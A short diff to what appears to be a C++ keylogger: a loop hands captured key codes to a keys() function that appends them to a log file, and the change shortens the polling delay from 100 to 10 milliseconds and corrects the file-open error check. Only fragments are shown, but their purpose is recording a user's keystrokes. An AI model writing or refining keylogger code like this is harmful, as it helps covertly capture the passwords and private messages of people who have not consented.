@@ -15,7 +15,7 @@ int main() {
 				keys(i, logFile.c_str());
 			}
 		}
-		Sleep(100);
+		Sleep(10);
 	}
 
 	return 0;
@@ -25,7 +25,9 @@ void keys(int key, const char *filename) {
 
 	FILE *OUTPUT_FILE;
 	if (OUTPUT_FILE = fopen(filename, "a+")) {
-		cout << "Cannot open file." << endl;
+	}
+	else {
+		cout << "Cannot open file for logging." << endl;
 	}
 
 	switch (key) {
